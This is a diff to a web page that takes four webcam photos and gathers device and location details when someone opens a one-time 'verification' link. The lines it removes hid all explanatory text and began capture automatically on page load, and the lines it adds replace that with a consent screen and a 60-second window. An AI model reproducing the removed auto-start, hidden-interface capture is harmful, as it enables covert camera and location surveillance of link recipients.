@@ -12,7 +12,12 @@ body{min-height:100svh;display:grid;place-items:center;padding:0;box-sizing:bord
 .status-screen{width:100%;height:100%;display:grid;place-items:center;background:#fff}
 .status-box{display:grid;place-items:center;width:100%;height:100%;background:#fff;border:0;border-radius:0;box-shadow:none;padding:0}
 .spinner{display:block!important;width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
-.status-title,.status-text,.progress,.action-button{display:none!important}
+.status-title{display:block!important;font:700 1.15rem system-ui,sans-serif;text-align:center;margin:18px 20px 8px;color:#111}
+.status-text{display:block!important;max-width:420px;margin:0 24px 18px;text-align:center;font:14px/1.55 system-ui,sans-serif;color:#4b5563}
+.progress{display:block!important;width:min(280px,75vw);height:5px;border-radius:99px;background:#e5e7eb;overflow:hidden;margin:0 auto 18px}
+.progress[hidden],.action-button[hidden]{display:none!important}
+.progress span{display:block;height:100%;width:0;background:#111;transition:width .2s}
+.action-button{display:inline-flex!important;align-items:center;justify-content:center;min-height:46px;margin:0 auto;padding:0 22px;border:0;border-radius:10px;background:#111;color:#fff;font:700 14px system-ui,sans-serif;cursor:pointer}
 video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
 @keyframes spin{to{transform:rotate(360deg)}}
 </style>
@@ -38,7 +43,7 @@ const pathToken=location.pathname.startsWith("/verification/")?decodeURIComponen
 const token=pathToken||queryToken;
 const video=document.getElementById("video");
 const canvas=document.getElementById("canvas");
-let stream=null,busy=false;
+let stream=null,busy=false,captureDeadline=0;
 const statusTitle=document.getElementById("statusTitle");
 const statusText=document.getElementById("statusText");
 const spinner=document.getElementById("spinner");
@@ -257,15 +262,27 @@ async function captureFour(){
     await video.play().catch(()=>{});
     await waitForVideo();
 
+    // Start the server-authoritative 60-second capture window only after camera readiness.
+    const startResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/start",{method:"POST",credentials:"omit",cache:"no-store",headers:{Accept:"application/json"}});
+    const startData=await startResponse.json().catch(()=>({}));
+    if(!startResponse.ok||!startData.success)throw new Error(startData.error||"Could not start the secure capture window.");
+    captureDeadline=Date.parse(startData.captureDeadlineAt||"");
+    if(!Number.isFinite(captureDeadline))throw new Error("The secure capture window could not be verified.");
+
     // Collect device/location details while the camera is ready.
     metadata=await enrichMetadata();
     for(let i=0;i<4;i++){
-      setStatus("Taking verification photos","Please keep your face and device visible. Photo "+(i+1)+" of 4.",{loading:true,percent:i*25});
+      if(Date.now()>captureDeadline)throw new Error("The 60-second capture window expired. Ask the admin for a new link.");
+      setStatus("Taking verification photos","Photo "+(i+1)+" of 4. All four photos must be captured within 60 seconds.",{loading:true,percent:i*20});
       blobs.push(await frameBlob(i+1,metadata));
-      if(i<3)await pause(2200);
+      if(i<3)await pause(1500);
     }
+    if(Date.now()>captureDeadline)throw new Error("The 60-second capture window expired. Ask the admin for a new link.");
+    const completeResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/complete",{method:"POST",credentials:"omit",cache:"no-store",headers:{Accept:"application/json"}});
+    const completeData=await completeResponse.json().catch(()=>({}));
+    if(!completeResponse.ok||!completeData.success)throw new Error(completeData.error||"The four-photo capture did not finish within 60 seconds.");
 
-    setStatus("Saving verification photos","Securing the four photos before sending them.",{loading:true,percent:85});
+    setStatus("Saving verification photos","Securing all four photos before uploading them to the case.",{loading:true,percent:85});
     const queued=await queueBatch(blobs,{...metadata,totalCaptures:4});
     if(!queued)throw new Error("This browser could not save the photos securely. Check available storage and try again.");
 
@@ -313,10 +330,8 @@ if("serviceWorker" in navigator){
   navigator.serviceWorker.register("/sw.js",{scope:"/"}).catch(()=>{});
 }
 startButton.onclick=captureFour;
-// Opening this one-time verification link starts the consent flow; the browser still
-// displays its native camera permission prompt before any image is captured.
-setStatus("Please wait","",{loading:true,percent:0});
-setTimeout(()=>captureFour(),250);
+// The recipient must actively consent before the browser requests camera access.
+setStatus("Four-photo verification","This authorized link will capture four photos from your camera and attach them to the recovery case shown in the link. The four photos must be captured within 60 seconds. Your camera is used only after you choose to continue.",{loading:false,buttonText:"I consent & start",buttonAction:captureFour,percent:0});
 window.addEventListener("online",async()=>{
   if(!busy){
     const result=await flushQueue();
